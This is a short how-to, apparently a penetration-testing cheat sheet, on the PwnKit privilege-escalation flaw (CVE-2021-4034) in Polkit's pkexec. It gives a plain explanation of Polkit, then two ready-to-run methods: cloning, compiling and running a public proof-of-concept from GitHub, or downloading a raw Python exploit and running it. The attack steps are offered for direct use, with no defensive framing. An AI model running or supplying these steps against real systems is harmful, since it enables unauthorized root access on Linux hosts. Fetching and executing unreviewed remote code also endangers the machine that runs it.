### What is **Polkit**? (CVE-2021-4034) **(Pwnkit)** vulnerability:

**Polkit (PolicyKit)** is like a **security gatekeeper** on Linux systems. It helps control **who can do what**—especially when a normal user tries to do something that normally requires **administrator (root)** permissions.
Think of it like this:
- You ask to do something big (like install software).
- Polkit checks: “Are you allowed to do that?”
- If yes → allowed.
- If not → denied (unless you prove you're root or an admin).

###  `pkexec 0.105 is vulnerable `

## Method 1
```bash
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
./poc
```

## Method 2
```
https://raw.githubusercontent.com/Almorabea/pkexec-exploit/refs/heads/main/CVE-2021-4034.py
```
 run this code using python 